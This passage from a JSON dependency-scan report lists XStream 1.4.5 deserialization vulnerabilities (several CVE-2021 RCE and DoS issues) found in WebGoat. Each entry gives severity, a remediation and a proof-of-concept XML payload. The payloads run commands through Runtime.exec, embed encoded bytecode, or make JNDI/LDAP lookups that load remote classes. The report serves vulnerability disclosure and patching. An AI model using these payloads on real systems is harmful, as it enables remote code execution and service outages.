</parameter-types>\r\n            </method>\r\n            <sun.tracing.dtrace.DTraceProbe>\r\n              <proxy class='java.lang.Runtime'/>\r\n              <implementing__method>\r\n                <class>java.lang.Runtime</class>\r\n                <name>exec</name>\r\n                <parameter-types>\r\n                  <class>java.lang.String</class>\r\n                </parameter-types>\r\n              </implementing__method>\r\n            </sun.tracing.dtrace.DTraceProbe>\r\n          </entry>\r\n        </probes>\r\n      </handler>\r\n    </dynamic-proxy>\r\n    <string>calc</string>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39144.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:17:50Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569183",
      "identifiers": {
        "CWE": [
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-j9h8-phrw-h4fh"
        ],
        "CVE": [
          "CVE-2021-39144"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-09-30T15:33:07.541975Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:24.537044Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39144.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Remote Code Execution (RCE)",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:30.757942Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:40:13.485582Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:20.584383Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:33:14.085093Z",
      "credit": [
        "ka1n4t"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n\r\n### PoC\r\n\r\n```\r\n<sorted-set>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='javax.swing.MultiUIDefaults' serialization='custom'>\r\n      <unserializable-parents/>\r\n      <hashtable>\r\n        <default>\r\n          <loadFactor>0.75</loadFactor>\r\n          <threshold>525</threshold>\r\n        </default>\r\n        <int>700</int>\r\n        <int>0</int>\r\n      </hashtable>\r\n      <javax.swing.UIDefaults>\r\n        <default>\r\n          <defaultLocale>zh_CN</defaultLocale>\r\n          <resourceCache/>\r\n        </default>\r\n      </javax.swing.UIDefaults>\r\n      <javax.swing.MultiUIDefaults>\r\n        <default>\r\n          <tables>\r\n            <javax.swing.UIDefaults serialization='custom'>\r\n              <unserializable-parents/>\r\n              <hashtable>\r\n                <default>\r\n                  <loadFactor>0.75</loadFactor>\r\n                  <threshold>525</threshold>\r\n                </default>\r\n                <int>700</int>\r\n                <int>1</int>\r\n                <string>ggg</string>\r\n                <javax.swing.UIDefaults_-ProxyLazyValue>\r\n                  <className>javax.naming.InitialContext</className>\r\n                  <methodName>doLookup</methodName>\r\n                  <args>\r\n                    <arg>ldap://localhost:1099/CallRemoteMethod</arg>\r\n                  </args>\r\n                </javax.swing.UIDefaults_-ProxyLazyValue>\r\n              </hashtable>\r\n              <javax.swing.UIDefaults>\r\n                <default>\r\n                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>\r\n                  <resourceCache/>\r\n                </default>\r\n              </javax.swing.UIDefaults>\r\n            </javax.swing.UIDefaults>\r\n          </tables>\r\n        </default>\r\n      </javax.swing.MultiUIDefaults>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n      <m__obj class='string'>test</m__obj>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n</sorted-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39154.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:32:04Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569185",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-6w62-hx7r-mw68"
        ],
        "CVE": [
          "CVE-2021-39154"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-01-28T15:25:00.908232Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:24.314152Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39154.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:30.454374Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:39:28.445299Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:24.446398Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:35:50.612195Z",
      "credit": [
        "Lai Han"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n\r\n### PoC\r\n\r\n```\r\n<linked-hash-set>\r\n  <dynamic-proxy>\r\n    <interface>map</interface>\r\n    <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>\r\n\t  <classToInvocationHandler class='linked-hash-map'/>\r\n      <defaultHandler class='sun.tracing.NullProvider'>\r\n        <active>true</active>\r\n        <providerType>java.lang.Object</providerType>\r\n        <probes>\r\n          <entry>\r\n            <method>\r\n              <class>java.lang.Object</class>\r\n              <name>hashCode</name>\r\n              <parameter-types/>\r\n            </method>\r\n            <sun.tracing.dtrace.DTraceProbe>\r\n              <proxy class='com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl' serialization='custom'/>\r\n                <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n                  <default>\r\n                    <__name>Pwnr</__name>\r\n                    <__bytecodes>\r\n                      <byte-array>yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAbeXNvc2VyaWFsL1B3bmVyNjMzNTA1NjA2NTkzAQAdTHlzb3NlcmlhbC9Qd25lcjYzMzUwNTYwNjU5MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=</byte-array>\r\n                      <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\r\n                    </__bytecodes>\r\n                    <__transletIndex>-1</__transletIndex>\r\n                    <__indentNumber>0</__indentNumber>\r\n                  </default>\r\n                </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n              </proxy>\r\n              <implementing__method>\r\n                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\r\n                <name>getOutputProperties</name>\r\n                <parameter-types/>\r\n              </implementing__method>\r\n            </sun.tracing.dtrace.DTraceProbe>\r\n          </entry>\r\n        </probes>\r\n      </defaultHandler>\r\n    </handler>\r\n  </dynamic-proxy>\r\n</linked-hash-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [GitHub Advisory](https://github.com/x-stream/xstream/security/advisories/GHSA-3ccq-5vw3-2p6x)\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39149.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:34:18Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569186",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-3ccq-5vw3-2p6x"
        ],
        "CVE": [
          "CVE-2021-39149"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:24.092081Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:24.090306Z",
      "references": [
        {
          "title": "GitHub Advisory",
          "url": "https://github.com/x-stream/xstream/security/advisories/GHSA-3ccq-5vw3-2p6x"
        },
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39149.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:25.667656Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:39:21.186829Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:10.016495Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:39:25.017804Z",
      "credit": [
        "Li4n0"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n\r\n### PoC\r\n\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n    </default>\r\n    <int>3</int>\r\n    <javax.naming.ldap.Rdn_-RdnEntry>\r\n      <type>12345</type>\r\n      <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n        <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &#x3C;none&#x3E;</m__obj>\r\n      </value>\r\n    </javax.naming.ldap.Rdn_-RdnEntry>\r\n    <javax.naming.ldap.Rdn_-RdnEntry>\r\n      <type>12345</type>\r\n      <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\r\n        <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\r\n          <parsedMessage>true</parsedMessage>\r\n          <soapVersion>SOAP_11</soapVersion>\r\n          <bodyParts/>\r\n          <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\r\n            <attachmentsInitialized>false</attachmentsInitialized>\r\n            <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\r\n              <soapPart/>\r\n              <mm>\r\n                <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\r\n                  <aliases class='com.sun.jndi.ldap.LdapBindingEnumeration'>\r\n                    <homeCtx>\r\n                      <hostname>233.233.233.233</hostname>\r\n                      <port__number>2333</port__number>\r\n                      <clnt class='com.sun.jndi.ldap.LdapClient'/>\r\n                    </homeCtx>\r\n                    <hasMoreCalled>true</hasMoreCalled>\r\n                    <more>true</more>\r\n                    <posn>0</posn>\r\n                    <limit>1</limit>\r\n                    <entries>\r\n                      <com.sun.jndi.ldap.LdapEntry>\r\n                        <DN>uid=songtao.xu,ou=oa,dc=example,dc=com</DN>\r\n                        <attributes class='javax.naming.directory.BasicAttributes' serialization='custom'>\r\n                          <javax.naming.directory.BasicAttribute>\r\n                            <default>\r\n                              <ignoreCase>false</ignoreCase>\r\n                            </default>\r\n                            <int>4</int>\r\n                            <javax.naming.directory.BasicAttribute serialization='custom'>\r\n                              <javax.naming.directory.BasicAttribute>\r\n                                <default>\r\n                                  <ordered>false</ordered>\r\n                                  <attrID>objectClass</attrID>\r\n                                </default>\r\n                                <int>1</int>\r\n                                <string>javanamingreference</string>\r\n                              </javax.naming.directory.BasicAttribute>\r\n                            </javax.naming.directory.BasicAttribute>\r\n                            <javax.naming.directory.BasicAttribute serialization='custom'>\r\n                              <javax.naming.directory.BasicAttribute>\r\n                                <default>\r\n                                  <ordered>false</ordered>\r\n                                  <attrID>javaCodeBase</attrID>\r\n                                </default>\r\n                                <int>1</int>\r\n                                <string>http://127.0.0.1:2333/</string>\r\n                              </javax.naming.directory.BasicAttribute>\r\n                            </javax.naming.directory.BasicAttribute>\r\n                            <javax.naming.directory.BasicAttribute serialization='custom'>\r\n                              <javax.naming.directory.BasicAttribute>\r\n                                <default>\r\n                                  <ordered>false</ordered>\r\n                                  <attrID>javaClassName</attrID>\r\n                                </default>\r\n                                <int>1</int>\r\n                                <string>refClassName</string>\r\n                              </javax.naming.directory.BasicAttribute>\r\n                            </javax.naming.directory.BasicAttribute>\r\n                            <javax.naming.directory.BasicAttribute serialization='custom'>\r\n                              <javax.naming.directory.BasicAttribute>\r\n                                <default>\r\n                                  <ordered>false</ordered>\r\n                                  <attrID>javaFactory</attrID>\r\n                                </default>\r\n                                <int>1</int>\r\n                                <string>Evil</string>\r\n                              </javax.naming.directory.BasicAttribute>\r\n                            </javax.naming.directory.BasicAttribute>\r\n                          </javax.naming.directory.BasicAttribute>\r\n                        </attributes>\r\n                      </com.sun.jndi.ldap.LdapEntry>\r\n                    </entries>\r\n                  </aliases>\r\n                </it>\r\n              </mm>\r\n            </multiPart>\r\n          </sm>\r\n        </message>\r\n      </value>\r\n    </javax.naming.ldap.Rdn_-RdnEntry>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39145.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:38:02Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569187",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-8jrj-525p-826v"
        ],
        "CVE": [
          "CVE-2021-39145"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:23.851231Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:23.849157Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39145.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:34.123999Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:36:16.217442Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:17.872437Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T08:42:23.261870Z",
      "credit": [
        "Lai Han"
      ],
      "cvssScore": 6.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). This vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<linked-hash-set>\r\n  <sun.reflect.annotation.AnnotationInvocationHandler serialization='custom'>\r\n    <sun.reflect.annotation.AnnotationInvocationHandler>\r\n      <default>\r\n        <memberValues class='javax.script.SimpleBindings'>\r\n          <map class='javax.script.SimpleBindings' reference='..'/>\r\n        </memberValues>\r\n        <type>javax.xml.transform.Templates</type>\r\n      </default>\r\n    </sun.reflect.annotation.AnnotationInvocationHandler>\r\n  </sun.reflect.annotation.AnnotationInvocationHandler>\r\n</linked-hash-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39140.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T08:41:01Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
